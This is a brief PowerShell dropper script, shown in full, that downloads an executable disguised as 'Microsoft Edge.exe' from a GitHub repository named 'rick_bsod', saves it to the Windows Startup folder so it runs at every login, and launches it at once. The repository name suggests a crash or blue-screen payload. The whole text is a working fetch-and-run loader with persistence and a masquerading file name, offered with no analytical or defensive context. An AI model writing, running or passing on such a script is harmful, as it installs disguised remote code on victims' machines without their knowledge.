$url = "https://github.com/discordl78-ops/rick_bsod/raw/refs/heads/main/Microsoft%20Edge.exe"
$outputPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Edge.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

Start-Process $outputPath
